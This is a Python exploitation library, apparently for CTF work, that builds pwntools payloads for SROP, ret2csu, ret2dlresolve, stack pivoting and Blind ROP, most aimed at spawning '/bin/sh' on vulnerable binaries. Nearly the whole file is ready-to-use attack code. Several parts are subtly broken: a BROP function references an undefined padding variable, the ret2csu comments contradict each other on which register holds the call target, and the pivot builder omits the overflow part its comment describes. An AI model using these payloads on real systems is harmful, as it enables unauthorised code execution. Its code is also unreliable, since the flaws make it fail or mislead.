#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
高级ROP技术模块 - CTF进阶必备

支持的技术:
- SROP (Sigreturn Oriented Programming)
- ret2csu (通用gadget利用)
- ret2dlresolve (无需泄露libc)
- Stack Pivot
- BROP (Blind ROP) 辅助

用于CTF竞赛和授权的安全评估
"""

from pwn import *
import os
import subprocess
from typing import Optional, Tuple, List, Dict

# 颜色定义
class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    END = '\033[0m'

def print_info(msg):
    print(f"{Colors.BLUE}[*]{Colors.END} {msg}")

def print_success(msg):
    print(f"{Colors.GREEN}[+]{Colors.END} {msg}")

def print_warning(msg):
    print(f"{Colors.YELLOW}[!]{Colors.END} {msg}")

def print_error(msg):
    print(f"{Colors.RED}[-]{Colors.END} {msg}")


class SROPExploit:
    """
    SROP (Sigreturn Oriented Programming) 利用类

    原理: 利用sigreturn系统调用恢复寄存器状态,
          可以一次性控制所有寄存器
    """

    def __init__(self, binary_path: str, arch: str = 'amd64'):
        self.binary = binary_path
        self.arch = arch
        context.arch = arch

    def find_syscall_gadget(self) -> Optional[int]:
        """查找syscall; ret gadget"""
        try:
            result = subprocess.run(
                ['ropper', '--file', self.binary, '--search', 'syscall'],
                capture_output=True, text=True
            )
            for line in result.stdout.split('\n'):
                if 'syscall' in line and 'ret' in line:
                    addr = line.split(':')[0].strip()
                    return int(addr, 16)
        except:
            pass
        return None

    def find_sigreturn_gadget(self) -> Optional[int]:
        """查找可用于触发sigreturn的gadget"""
        # sigreturn syscall number: 15 (x64), 119 (x86)
        syscall_num = 15 if self.arch == 'amd64' else 119

        # 方法1: 查找 mov rax, 15; syscall
        try:
            result = subprocess.run(
                ['ropper', '--file', self.binary, '--search', f'mov eax, {syscall_num}'],
                capture_output=True, text=True
            )
            for line in result.stdout.split('\n'):
                if f'mov eax, {hex(syscall_num)}' in line or f'mov eax, {syscall_num}' in line:
                    addr = line.split(':')[0].strip()
                    return int(addr, 16)
        except:
            pass

        return None

    def build_sigframe(self, rip: int, rsp: int = 0,
                       rdi: int = 0, rsi: int = 0, rdx: int = 0,
                       rax: int = 59) -> bytes:
        """
        构建SigreturnFrame

        常用场景:
        - execve("/bin/sh", NULL, NULL): rax=59, rdi=binsh, rsi=0, rdx=0
        - read(0, buf, size): rax=0, rdi=0, rsi=buf, rdx=size
        - mprotect(addr, len, prot): rax=10, rdi=addr, rsi=len, rdx=7
        """
        print_info("构建 SigreturnFrame")

        frame = SigreturnFrame()
        frame.rax = rax
        frame.rdi = rdi
        frame.rsi = rsi
        frame.rdx = rdx
        frame.rip = rip
        frame.rsp = rsp if rsp else rip + 8

        print_info(f"  rax (syscall): {rax}")
        print_info(f"  rdi: {hex(rdi)}")
        print_info(f"  rsi: {hex(rsi)}")
        print_info(f"  rdx: {hex(rdx)}")
        print_info(f"  rip: {hex(rip)}")

        return bytes(frame)

    def exploit_execve(self, syscall_addr: int, binsh_addr: int,
                       sigreturn_gadget: int = None) -> bytes:
        """
        使用SROP执行execve("/bin/sh", NULL, NULL)
        """
        print_info("构建 SROP execve payload")

        frame = self.build_sigframe(
            rip=syscall_addr,
            rdi=binsh_addr,
            rsi=0,
            rdx=0,
            rax=59  # execve
        )

        if sigreturn_gadget:
            # 有专门的sigreturn gadget
            payload = p64(sigreturn_gadget) + frame
        else:
            # 需要设置rax=15然后syscall
            print_warning("需要手动设置rax=15")
            payload = frame

        print_success("SROP payload 构建完成")
        return payload


class Ret2CSU:
    """
    ret2csu (Universal Gadget) 利用类

    利用 __libc_csu_init 中的通用gadget控制:
    - rbx, rbp, r12, r13, r14, r15 (gadget 1)
    - rdx, rsi, edi, call [r12+rbx*8] (gadget 2)
    """

    def __init__(self, binary_path: str):
        self.binary = binary_path
        self.elf = ELF(binary_path, checksec=False)
        self.gadget1 = None  # pop rbx...ret
        self.gadget2 = None  # mov rdx, r14...call
        self._find_gadgets()

    def _find_gadgets(self):
        """查找csu gadgets"""
        try:
            csu_init = self.elf.symbols.get('__libc_csu_init', 0)
            if csu_init == 0:
                print_warning("未找到 __libc_csu_init")
                return

            # gadget1 通常在 csu_init + 0x5a 左右
            # gadget2 通常在 csu_init + 0x40 左右
            # 具体偏移需要通过反汇编确认

            result = subprocess.run(
                ['objdump', '-d', self.binary],
                capture_output=True, text=True
            )

            in_csu = False
            for line in result.stdout.split('\n'):
                if '__libc_csu_init' in line:
                    in_csu = True
                    continue

                if in_csu:
                    # 查找 pop rbx; pop rbp; pop r12...
                    if 'pop' in line and 'rbx' in line:
                        addr = line.strip().split(':')[0].strip()
                        self.gadget1 = int(addr, 16)

                    # 查找 mov rdx, r14 或 mov rdx, r15
                    if 'mov' in line and 'rdx' in line and ('r14' in line or 'r15' in line):
                        addr = line.strip().split(':')[0].strip()
                        self.gadget2 = int(addr, 16)

                    if '<' in line and '__libc_csu_init' not in line:
                        in_csu = False

            if self.gadget1 and self.gadget2:
                print_success(f"找到 csu gadgets:")
                print_info(f"  gadget1 (pop rbx...): {hex(self.gadget1)}")
                print_info(f"  gadget2 (mov rdx...): {hex(self.gadget2)}")

        except Exception as e:
            print_error(f"查找csu gadgets失败: {e}")

    def build_payload(self, call_addr: int,
                      rdi: int = 0, rsi: int = 0, rdx: int = 0,
                      next_ret: int = 0) -> bytes:
        """
        构建ret2csu payload

        参数:
            call_addr: 要调用的函数地址 (会通过 call [r12+rbx*8] 调用)
            rdi, rsi, rdx: 函数参数
            next_ret: 调用后返回地址

        注意: call_addr 需要是一个包含目标函数指针的地址 (如GOT表项)
        """
        if not self.gadget1 or not self.gadget2:
            print_error("未找到必要的gadgets")
            return b''

        print_info("构建 ret2csu payload")

        # gadget1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
        # gadget2: mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]

        payload = flat([
            self.gadget1,
            0,              # rbx = 0
            1,              # rbp = 1 (rbx+1后比较用)
            rdi,            # r12 -> edi
            rsi,            # r13 -> rsi
            rdx,            # r14 -> rdx
            call_addr,      # r15 (call [r15+rbx*8] = call [call_addr])
            self.gadget2,

            # gadget2执行后会: add rbx, 1; cmp rbp, rbx; jne ...
            # 然后会再次执行类似的pop序列
            b'A' * 8,       # 填充 (add rsp, 8)
            0, 0, 0, 0, 0, 0,  # pop rbx...r15
            next_ret,       # ret地址
        ])

        print_success("ret2csu payload 构建完成")
        return payload


class Ret2DLResolve:
    """
    ret2dlresolve 利用类

    原理: 构造假的重定位表项和符号表项,
          让动态链接器解析我们指定的函数
    """

    def __init__(self, binary_path: str):
        self.binary = binary_path
        self.elf = ELF(binary_path, checksec=False)
        self.context = context

    def build_payload_32(self, bss_addr: int, system_string: str = "system") -> Tuple[bytes, bytes]:
        """
        构建32位ret2dlresolve payload

        返回: (rop_chain, fake_structures)
        """
        print_info("构建 32位 ret2dlresolve payload")

        # 获取关键地址
        plt0 = self.elf.get_section_by_name('.plt').header.sh_addr
        rel_plt = self.elf.get_section_by_name('.rel.plt').header.sh_addr
        dynsym = self.elf.get_section_by_name('.dynsym').header.sh_addr
        dynstr = self.elf.get_section_by_name('.dynstr').header.sh_addr

        # 在bss构造假结构
        fake_sym_addr = bss_addr + 0x100
        fake_rel_addr = bss_addr + 0x200
        fake_str_addr = bss_addr + 0x300

        # 计算reloc_arg
        reloc_arg = fake_rel_addr - rel_plt

        # 构造假符号表项
        sym_index = (fake_sym_addr - dynsym) // 16
        fake_sym = flat([
            fake_str_addr - dynstr,  # st_name
            0,                        # st_value
            0,                        # st_size
            0x12,                     # st_info (FUNC | GLOBAL)
        ])

        # 构造假重定位表项
        fake_rel = flat([
            self.elf.got['read'],  # 任意GOT表项
            (sym_index << 8) | 7,   # r_info (R_386_JMP_SLOT)
        ])

        # 假字符串
        fake_str = system_string.encode() + b'\x00'

        # 组合假结构
        fake_structures = b'\x00' * 0x100
        fake_structures += fake_sym
        fake_structures = fake_structures.ljust(0x200, b'\x00')
        fake_structures += fake_rel
        fake_structures = fake_structures.ljust(0x300, b'\x00')
        fake_structures += fake_str

        # ROP链
        rop_chain = flat([
            plt0,
            reloc_arg,
            0xdeadbeef,  # 假返回地址
            bss_addr + 0x400,  # system参数 ("/bin/sh")
        ])

        print_success("ret2dlresolve payload 构建完成")
        return rop_chain, fake_structures

    def build_payload_64(self, bss_addr: int) -> Tuple[bytes, bytes]:
        """
        构建64位ret2dlresolve payload

        64位更复杂,需要绕过更多检查
        """
        print_warning("64位 ret2dlresolve 较为复杂,建议使用pwntools的Ret2dlresolvePayload")

        # 使用pwntools内置工具
        try:
            from pwnlib.rop.ret2dlresolve import Ret2dlresolvePayload

            rop = ROP(self.elf)
            dlresolve = Ret2dlresolvePayload(self.elf, symbol="system", args=["/bin/sh"])

            # 需要先把fake structures写入内存
            # rop.read(0, dlresolve.data_addr)
            # rop.ret2dlresolve(dlresolve)

            return rop.chain(), dlresolve.payload

        except ImportError:
            print_error("请更新pwntools以支持Ret2dlresolvePayload")
            return b'', b''


class StackPivot:
    """
    Stack Pivot 技术

    用于栈空间不足时将栈迁移到可控区域
    """

    def __init__(self, binary_path: str):
        self.binary = binary_path

    def find_pivot_gadgets(self) -> Dict[str, List[int]]:
        """查找可用于stack pivot的gadgets"""
        gadgets = {
            'leave_ret': [],
            'pop_rsp': [],
            'xchg_rax_rsp': [],
            'mov_rsp': [],
        }

        try:
            # leave; ret (最常用)
            result = subprocess.run(
                ['ropper', '--file', self.binary, '--search', 'leave; ret'],
                capture_output=True, text=True
            )
            for line in result.stdout.split('\n'):
                if 'leave' in line and 'ret' in line:
                    addr = line.split(':')[0].strip()
                    if addr.startswith('0x'):
                        gadgets['leave_ret'].append(int(addr, 16))

            # pop rsp; ret
            result = subprocess.run(
                ['ropper', '--file', self.binary, '--search', 'pop rsp'],
                capture_output=True, text=True
            )
            for line in result.stdout.split('\n'):
                if 'pop rsp' in line:
                    addr = line.split(':')[0].strip()
                    if addr.startswith('0x'):
                        gadgets['pop_rsp'].append(int(addr, 16))

        except Exception as e:
            print_error(f"查找pivot gadgets失败: {e}")

        return gadgets

    def build_pivot_payload(self, leave_ret: int, new_stack: int,
                            rop_chain: bytes) -> bytes:
        """
        构建stack pivot payload

        原理: leave = mov rsp, rbp; pop rbp
              通过控制rbp来控制rsp
        """
        print_info(f"构建 Stack Pivot payload")
        print_info(f"  新栈地址: {hex(new_stack)}")
        print_info(f"  leave;ret gadget: {hex(leave_ret)}")

        # payload结构:
        # [padding] [new_stack-8] [leave_ret]
        # new_stack处: [fake_rbp] [rop_chain...]

        # 在新栈构造ROP链
        new_stack_content = p64(new_stack + 0x100) + rop_chain

        print_success("Stack Pivot payload 构建完成")
        return new_stack_content


class BROPHelper:
    """
    BROP (Blind ROP) 辅助工具

    用于无法获取二进制文件的盲打场景
    """

    def __init__(self, io):
        self.io = io

    def find_stop_gadget(self, base: int = 0x400000,
                         step: int = 1) -> Optional[int]:
        """
        查找stop gadget (不会crash的地址)
        """
        print_info("搜索 stop gadget...")

        for i in range(0, 0x1000, step):
            addr = base + i
            try:
                self.io.sendline(b'A' * padding + p64(addr))
                response = self.io.recv(timeout=0.5)
                if response:
                    print_success(f"找到 stop gadget: {hex(addr)}")
                    return addr
            except:
                continue

        return None

    def find_brop_gadget(self, stop_gadget: int,
                         padding: int) -> Optional[int]:
        """
        查找BROP gadget (pop rbx; pop rbp; pop r12; ... ret)

        特征: 连续pop 6个寄存器
        """
        print_info("搜索 BROP gadget...")

        # BROP gadget 后面跟6个stop gadget不会crash
        for addr in range(0x400000, 0x401000):
            payload = b'A' * padding
            payload += p64(addr)
            payload += p64(stop_gadget) * 6
            payload += p64(stop_gadget)

            try:
                self.io.sendline(payload)
                response = self.io.recv(timeout=0.5)
                if response:
                    print_success(f"可能的 BROP gadget: {hex(addr)}")
                    return addr
            except:
                continue

        return None

    def find_puts_plt(self, brop_gadget: int, stop_gadget: int,
                      padding: int) -> Optional[int]:
        """
        查找puts@plt用于泄露内存
        """
        print_info("搜索 puts@plt...")

        pop_rdi = brop_gadget + 9  # 通常 pop rdi; ret 在 BROP gadget + 9

        # 尝试puts打印一个已知字符串
        for addr in range(0x400000, 0x401000, 0x10):
            payload = b'A' * padding
            payload += p64(pop_rdi)
            payload += p64(0x400000)  # ELF header (可识别的内容)
            payload += p64(addr)       # 可能的puts
            payload += p64(stop_gadget)

            try:
                self.io.sendline(payload)
                response = self.io.recv(timeout=0.5)
                if b'\x7fELF' in response:
                    print_success(f"找到 puts@plt: {hex(addr)}")
                    return addr
            except:
                continue

        return None


def analyze_rop_techniques(binary_path: str) -> Dict:
    """
    分析二进制文件可用的高级ROP技术
    """
    result = {
        'srop': {'available': False, 'gadgets': {}},
        'ret2csu': {'available': False, 'gadgets': {}},
        'stack_pivot': {'available': False, 'gadgets': {}},
    }

    # 检查SROP
    srop = SROPExploit(binary_path)
    syscall = srop.find_syscall_gadget()
    sigret = srop.find_sigreturn_gadget()
    if syscall:
        result['srop']['available'] = True
        result['srop']['gadgets']['syscall'] = syscall
        if sigret:
            result['srop']['gadgets']['sigreturn'] = sigret

    # 检查ret2csu
    csu = Ret2CSU(binary_path)
    if csu.gadget1 and csu.gadget2:
        result['ret2csu']['available'] = True
        result['ret2csu']['gadgets']['gadget1'] = csu.gadget1
        result['ret2csu']['gadgets']['gadget2'] = csu.gadget2

    # 检查stack pivot
    pivot = StackPivot(binary_path)
    pivot_gadgets = pivot.find_pivot_gadgets()
    if pivot_gadgets['leave_ret']:
        result['stack_pivot']['available'] = True
        result['stack_pivot']['gadgets'] = pivot_gadgets

    return result


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        result = analyze_rop_techniques(sys.argv[1])
        print(f"\n{Colors.BOLD}高级ROP技术分析:{Colors.END}")
        for technique, info in result.items():
            status = f"{Colors.GREEN}可用{Colors.END}" if info['available'] else f"{Colors.RED}不可用{Colors.END}"
            print(f"  {technique}: {status}")
            if info['gadgets']:
                for name, addr in info['gadgets'].items():
                    if isinstance(addr, int):
                        print(f"    {name}: {hex(addr)}")
